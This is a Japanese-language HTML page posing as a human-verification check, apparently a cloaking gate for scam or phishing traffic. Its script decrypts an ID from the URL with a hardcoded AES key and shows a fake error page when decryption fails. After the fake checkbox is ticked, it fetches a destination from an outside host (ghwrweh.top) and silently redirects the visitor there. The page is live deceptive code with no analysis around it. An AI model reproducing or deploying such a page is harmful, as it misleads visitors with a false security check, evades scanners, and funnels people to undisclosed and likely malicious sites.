<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>人間であることを確認します</title>
  <meta name="robots" content="noindex,nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: "Noto Sans JP", sans-serif;
      background: #f6f9fc;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .box {
      text-align: center;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #3498db;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .caption {
      font-size: 13px;
      color: #888;
      margin-top: 20px;
    }
    label {
      font-size: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-top: 20px;
    }
    input[type="checkbox"] {
      transform: scale(1.4);
      margin-right: 10px;
    }
    button {
      margin-top: 20px;
      padding: 10px 25px;
      font-size: 15px;
      background-color: #888;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .error-page {
      text-align: center;
      color: #222;
    }
    .error-page h2 {
      font-size: 20px;
      margin-bottom: 10px;
    }
    .error-page p {
      font-size: 14px;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="box" id="main-box" style="display: none;">
    <p>あなたが人間であることを知らせてください</p>
    <label><input type="checkbox" id="chk">人間であることを確認します</label>
    <button id="confirmBtn" disabled>確認する</button>
    <div class="spinner" id="spinner"></div>
    <div class="caption">セキュリティ認証サービス</div>
  </div>

  <div id="error-box" class="error-page" style="display: none;">
    <h2>ページの確認中に問題が発生しました。</h2>
    <p>しばらくしてからもう一度お試しください。</p>
    <hr>
  </div>

  <script>
    const AES_KEY = "5Ctianyoumabiiii";
    const checkbox = document.getElementById("chk");
    const button = document.getElementById("confirmBtn");
    const spinner = document.getElementById("spinner");
    const errorBox = document.getElementById("error-box");
    const mainBox = document.getElementById("main-box");

    let decryptedId = null;

    const path = location.pathname.split("/").filter(Boolean);
    const encryptedId = path[path.length - 1];

    // 页面加载后立即验证加密 ID
    (async () => {
      decryptedId = await decryptAES(encryptedId);
      if (!decryptedId) {
        showErrorPage();
      } else {
        mainBox.style.display = "block";
      }
    })();

    checkbox.addEventListener("change", () => {
      button.disabled = !checkbox.checked;
    });

    button.addEventListener("click", async () => {
      button.style.display = "none";
      spinner.style.display = "block";

      try {
        const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(decryptedId));
        const data = await res.json();
        const url = data?.data?.siteUrl;
        if (!url) throw new Error("No URL");

        setTimeout(() => {
          location.href = url;
        }, 2000);
      } catch {
        showErrorPage();
      }
    });

    function showErrorPage() {
      mainBox.style.display = "none";
      errorBox.style.display = "block";
    }

    async function decryptAES(encText) {
      try {
        const b64 = encText.replace(/-/g, '+').replace(/_/g, '/');
        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
        const iv = bytes.slice(0, 16);
        const data = bytes.slice(16);
        const key = await crypto.subtle.importKey("raw",
          new TextEncoder().encode(AES_KEY), { name: "AES-CBC" }, false, ["decrypt"]);
        const dec = await crypto.subtle.decrypt({ name: "AES-CBC", iv }, key, data);
        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
      } catch {
        return null;
      }
    }
  </script>
</body>
</html>
